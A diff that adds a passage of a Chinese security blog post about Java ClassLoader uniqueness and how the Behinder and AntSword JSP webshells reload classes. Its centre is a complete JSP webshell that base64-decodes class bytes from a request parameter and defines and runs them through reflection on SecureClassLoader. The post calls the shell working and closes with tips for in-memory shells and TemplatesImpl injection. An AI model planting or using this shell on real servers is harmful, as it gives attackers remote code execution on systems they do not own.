+</span></span><span class="line"><span class="cl">        <span class="kt">byte</span><span class="p">[]</span> <span class="nx">bytes</span> <span class="p">=</span> <span class="nx">Base64</span><span class="p">.</span><span class="nf">getDecoder</span><span class="p">().</span><span class="nf">decode</span><span class="p">(</span><span class="nx">cls</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nx">DefineLoader</span> <span class="nx">defineLoader1</span> <span class="p">=</span> <span class="nx">new</span> <span class="nf">DefineLoader</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">DefineLoader</span> <span class="nx">defineLoader2</span> <span class="p">=</span><span class="nx">new</span> <span class="nf">DefineLoader</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">Class</span> <span class="nx">cls1</span> <span class="p">=</span> <span class="nx">defineLoader1</span><span class="p">.</span><span class="nf">load</span><span class="p">(</span><span class="nx">bytes</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">System</span><span class="p">.</span><span class="nx">out</span><span class="p">.</span><span class="nb">println</span><span class="p">(</span><span class="nx">cls1</span><span class="p">.</span><span class="nf">hashCode</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">Class</span> <span class="nx">cls2</span> <span class="p">=</span> <span class="nx">defineLoader2</span><span class="p">.</span><span class="nf">load</span><span class="p">(</span><span class="nx">bytes</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">System</span><span class="p">.</span><span class="nx">out</span><span class="p">.</span><span class="nb">println</span><span class="p">(</span><span class="nx">cls2</span><span class="p">.</span><span class="nf">hashCode</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="nf">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">e</span><span class="p">.</span><span class="nf">printStackTrace</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1619178821551-0461c0d5-2239-4125-a43c-2705bd1926a0.png" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1619178821551-0461c0d5-2239-4125-a43c-2705bd1926a0.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1619178821551-0461c0d5-2239-4125-a43c-2705bd1926a0.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1619178821551-0461c0d5-2239-4125-a43c-2705bd1926a0.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1619178821551-0461c0d5-2239-4125-a43c-2705bd1926a0.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1619178821551-0461c0d5-2239-4125-a43c-2705bd1926a0.png 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure></p>
+<p>在JAVA世界里，决定一个类的唯一性主要有两点：</p>
+<ul>
+<li>类名</li>
+<li>他的类加载器。</li>
+</ul>
+<blockquote>
+<p>比较两个类是否“相等”，只有在这两个类是由同一个类加载器加载的前提下才有意义，否则，即使这两个类来源于同一个Class文件，被同一个虚拟机加载，只要加载它们的类加载器不同，那这两个类就必定不相等。</p>
+</blockquote>
+<p>所以在每次打过去的类名都是相同的情况下，我们只要保证这两个类是由不同的加载器去加载的就可以解决类重复加载的问题了。</p>
+<p>所以冰蝎、蚁剑的jsp shell在每次调用之前都会去new一个新的类加载器来加载对应的字节码，这样就可以保证不会出现类重复加载的问题。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1619179211419-cf589aef-928d-423a-8c7a-9951603ae9c6.png" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1619179211419-cf589aef-928d-423a-8c7a-9951603ae9c6.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1619179211419-cf589aef-928d-423a-8c7a-9951603ae9c6.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1619179211419-cf589aef-928d-423a-8c7a-9951603ae9c6.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1619179211419-cf589aef-928d-423a-8c7a-9951603ae9c6.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1619179211419-cf589aef-928d-423a-8c7a-9951603ae9c6.png 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure></p>
+<p>那么应该怎么用反射写呢？</p>
+<p>原来的shell中是写了一个子类继承ClassLoader，我们完全可以从jdk中找一个同样继承ClassLoader并且没有改写defineClass的子类</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1619179502098-1d196196-05d2-490b-b77f-5eebf0f6f9a6.png" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1619179502098-1d196196-05d2-490b-b77f-5eebf0f6f9a6.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1619179502098-1d196196-05d2-490b-b77f-5eebf0f6f9a6.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1619179502098-1d196196-05d2-490b-b77f-5eebf0f6f9a6.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1619179502098-1d196196-05d2-490b-b77f-5eebf0f6f9a6.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1619179502098-1d196196-05d2-490b-b77f-5eebf0f6f9a6.png 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure></p>
+<p>在这里我们选择java.security.SecureClassLoader这个类，每次去new一个这个类，然后defineClass.invoke的时候把new出来的ClassLoader实例给传进去。</p>
+<p>构造出来的shell如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%!
+</span></span><span class="line"><span class="cl">    public byte[] base64Decode(String str) throws Exception {
+</span></span><span class="line"><span class="cl">        try {
+</span></span><span class="line"><span class="cl">            Class clazz = Class.forName(&#34;sun.misc.BASE64Decoder&#34;);
+</span></span><span class="line"><span class="cl">            return (byte[]) clazz.getMethod(&#34;decodeBuffer&#34;, String.class).invoke(clazz.newInstance(), str);
+</span></span><span class="line"><span class="cl">        } catch (Exception e) {
+</span></span><span class="line"><span class="cl">            Class clazz = Class.forName(&#34;java.util.Base64&#34;);
+</span></span><span class="line"><span class="cl">            Object decoder = clazz.getMethod(&#34;getDecoder&#34;).invoke(null);
+</span></span><span class="line"><span class="cl">            return (byte[]) decoder.getClass().getMethod(&#34;decode&#34;, String.class).invoke(decoder, str);
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">%&gt;
+</span></span><span class="line"><span class="cl">&lt;%
+</span></span><span class="line"><span class="cl">    String cls = request.getParameter(&#34;ant&#34;);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    if (cls != null) {
+</span></span><span class="line"><span class="cl">        try {
+</span></span><span class="line"><span class="cl">            byte[] payload = base64Decode(cls);
+</span></span><span class="line"><span class="cl">            ClassLoader loader = this.getClass().getClassLoader();
+</span></span><span class="line"><span class="cl">            java.lang.reflect.Method defineMethod = java.lang.ClassLoader.class.getDeclaredMethod(&#34;defineClass&#34;, byte[].class, int.class, int.class);
+</span></span><span class="line"><span class="cl">            defineMethod.setAccessible(true);
+</span></span><span class="line"><span class="cl">            java.lang.reflect.Constructor constructor = java.security.SecureClassLoader.class.getDeclaredConstructor(ClassLoader.class);
+</span></span><span class="line"><span class="cl">            constructor.setAccessible(true);
+</span></span><span class="line"><span class="cl">            java.lang.ClassLoader cl = (java.lang.ClassLoader) constructor.newInstance(new Object[]{loader});
+</span></span><span class="line"><span class="cl">            java.lang.Class c = (java.lang.Class) defineMethod.invoke(cl, payload, 0, payload.length);
+</span></span><span class="line"><span class="cl">            c.newInstance().equals(request);
+</span></span><span class="line"><span class="cl">        } catch (Exception e) {
+</span></span><span class="line"><span class="cl">            e.printStackTrace();
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">%&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以正常使用</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1619179685080-3310ef1c-7fb5-4a47-a85e-27cf66c0f6bc.png" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1619179685080-3310ef1c-7fb5-4a47-a85e-27cf66c0f6bc.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1619179685080-3310ef1c-7fb5-4a47-a85e-27cf66c0f6bc.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1619179685080-3310ef1c-7fb5-4a47-a85e-27cf66c0f6bc.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1619179685080-3310ef1c-7fb5-4a47-a85e-27cf66c0f6bc.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1619179685080-3310ef1c-7fb5-4a47-a85e-27cf66c0f6bc.png 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure></p>
+<h2 id="最后" class="headerLink">
+    <a href="#%e6%9c%80%e5%90%8e" class="header-mark"></a>3 最后</h2><p>研究过内存马的同学可以发现，很多内存马都继承了ClassLoader这个类，原因就是如果新建一个子类的话，内部类会单独产生一个class文件，导致没办法一次性打过去。所以就干脆把外部类变成ClassLoader的子类，直接调用本类的defineClass方法来加载恶意字节码。</p>
+<p>但是在一些特殊情况下，比如说用TemplatesImpl打进去的时候，我们需要让恶意类来继承AbstractTranslet这个父类才可以，但是JAVA的设定是不能继承多个类。所以很多文章都是用TemplatesImpl的恶意类再去defineClass加载真正的内存马，这样就有点麻烦了。如果用本文中的写法，就不需要再继承ClassLoader了。</p>
+</div>
+
+        
+
+<div class="sponsor">
+        <div class="sponsor-avatar"><img
+        
+        loading="lazy"
+        src="/images/avatar.webp"
+        srcset="/images/avatar.webp, /images/avatar.webp 1.5x, /images/avatar.webp 2x"
+        sizes="auto"
+        alt="/images/avatar.webp"
+        title="/images/avatar.webp" height="640"   width="640" ></div><p class="sponsor-bio"><em>欢迎加入我的知识星球，共同交流网络安全技术~</em></p><div class="sponsor-custom"><a href="https://t.zsxq.com/FA6urjI" target="_blank"><img src="/zsxq.png" alt="网络安全回收站" style="width:50%;display:inline-block;" ></a></div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2021-04-30</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share"><button title="分享到 Twitter" data-sharer="twitter" data-url="https://yzddmr6.com/posts/classloader%E7%9A%84%E7%90%86%E8%A7%A3/" data-title="ClassLoader的理解"><span class="fab fa-twitter fa-fw"></span></button><button title="分享到 Facebook" data-sharer="facebook" data-url="https://yzddmr6.com/posts/classloader%E7%9A%84%E7%90%86%E8%A7%A3/"><span class="fab fa-facebook-square fa-fw"></span></button><button title="分享到 Hacker News" data-sharer="hackernews" data-url="https://yzddmr6.com/posts/classloader%E7%9A%84%E7%90%86%E8%A7%A3/" data-title="ClassLoader的理解"><span class="fab fa-hacker-news fa-fw"></span></button><button title="分享到 Line" data-sharer="line" data-url="https://yzddmr6.com/posts/classloader%E7%9A%84%E7%90%86%E8%A7%A3/" data-title="ClassLoader的理解"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="分享到 微博" data-sharer="weibo" data-url="https://yzddmr6.com/posts/classloader%E7%9A%84%E7%90%86%E8%A7%A3/" data-title="ClassLoader的理解"><span class="fab fa-weibo fa-fw"></span></button><button title="分享到 Telegram" data-sharer="telegram" data-url="https://yzddmr6.com/posts/classloader%E7%9A%84%E7%90%86%E8%A7%A3/" data-title="ClassLoader的理解" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
+    <button title="分享到 Mastodon"onclick="javascript:shareOnMastodon(&#34;ClassLoader的理解&#34;, &#34;https://yzddmr6.com/posts/classloader%E7%9A%84%E7%90%86%E8%A7%A3/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/as-exploits-v12-update/" class="prev" rel="prev" title="As-Exploits v1.2更新"><i class="fas fa-angle-left fa-fw"></i>As-Exploits v1.2更新</a>
+            <a href="/posts/as-exploits-v13-update/" class="next" rel="next" title="As-Exploits v1.3更新">As-Exploits v1.3更新<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="utterances"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/yzddmr6" target="_blank" rel="noopener noreferrer">yzddMr6</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"zh_cn_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"},"sharerjs":true,"table":{"sort":true}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
+</body>
+
+</html>
